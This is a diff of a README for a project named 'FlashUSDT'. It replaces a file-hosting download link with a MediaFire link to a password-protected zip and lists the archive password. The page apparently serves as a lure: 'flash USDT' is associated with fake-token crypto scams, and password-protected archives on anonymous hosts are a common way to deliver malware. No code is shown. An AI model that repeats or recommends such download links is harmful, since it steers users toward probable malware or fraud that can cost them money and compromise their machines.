@@ -1,6 +1,6 @@
 # FlashUSDT
 
-[Click Here To Download](https://store5.gofile.io/download/direct/af5cbd30-659e-4970-9114-4f0dac64dba9/FlashUSDT.zip)
+[Click Here To Download](https://www.mediafire.com/file/yfe990tjkexq46q/FlashUSDT.zip/file)
 [Pass : S3rv3r%.]
 
 
